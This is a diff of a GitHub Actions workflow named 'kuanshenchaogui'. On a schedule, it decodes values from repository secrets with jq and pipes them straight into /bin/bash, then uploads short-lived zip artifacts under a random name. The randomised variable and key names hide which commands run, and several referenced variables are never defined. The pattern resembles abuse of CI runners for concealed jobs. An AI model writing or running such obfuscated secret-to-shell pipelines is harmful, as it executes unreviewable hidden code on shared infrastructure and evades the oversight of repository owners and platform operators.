@@ -1,27 +1,26 @@
 name: kuanshenchaogui
-
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '13 4/6 * * *'
 
-jobs:  # 7505
+  schedule:
+    - cron: '15 5,11,17,23 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: kuanshenchaogui
         env:
-          jr5710: ${{ secrets.jr5710 }}
+          x821: ${{ secrets.x821 }}
         run: |
-          echo $jr5710 | jq -r .fgh3 | /bin/bash
-          echo $wiu73 | jq -r .mqynq718 | /bin/bash
-          echo $yo9 | jq -r .ilqjh200 | /bin/bash
-          echo $lry183 | jq -r .p07 | /bin/bash
-          echo $cscsn525 | jq -r .hvx97 | /bin/bash
-          echo $qhi7 | jq -r .i922 | /bin/bash
-          echo $x58 | jq -r .aoe7 | /bin/bash
-          echo $p51 | jq -r .jgx10 | /bin/bash
-          echo $azque56 | jq -r .zg034 | /bin/bash
-          echo $mld265 | jq -r .jd44791 | /bin/bash
+          printf '%s' "$x821" | jq -r .e508 | /bin/bash
+          printf '%s' "$mblze700" | jq -r .r63666 | /bin/bash
+          echo $eo3 | jq -r .nmr6 | /bin/bash
+          printf '%s' "$nann080" | jq -r .qamoc3956 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: doVQuA13
+          path: "*.zip"
+          retention-days: 1
